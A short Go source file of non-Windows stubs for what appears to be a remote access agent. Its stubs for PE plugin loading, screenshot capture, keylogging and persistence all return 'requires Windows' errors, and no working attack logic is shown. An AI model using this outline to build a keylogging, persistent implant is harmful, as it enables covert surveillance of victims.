//go:build !windows

package main

import (
	"context"
	"errors"
	"net/http"
	"os/exec"
	"time"
)

func newCommand(name string, args ...string) *exec.Cmd {
	command := exec.CommandContext(agentContext, name, args...)
	command.WaitDelay = 2 * time.Second
	return command
}

func loadPluginPE(*http.Client, *config, string, string, string) (string, error) {
	return "", errors.New("PE plugins require the Windows agent build")
}

func loadPluginPEContext(context.Context, *http.Client, *config, string, string, string) (string, error) {
	return "", errors.New("PE plugins require the Windows agent build")
}

func runPluginChild([]string) error {
	return errors.New("plugin child mode requires the Windows agent build")
}

func runWindowsPluginChild([]string) error {
	return errors.New("Windows library child mode requires the Windows agent build")
}

func captureScreenshot() (string, error) { return "", errors.New("screenshots require Windows") }

func stopPlatformWorkers() {}

func keylogAction(string) (string, string, error) {
	return "", "output", errors.New("keylogging requires Windows")
}

func persistenceAction(bool, *config) (string, error) {
	return "", errors.New("persistence requires Windows")
}
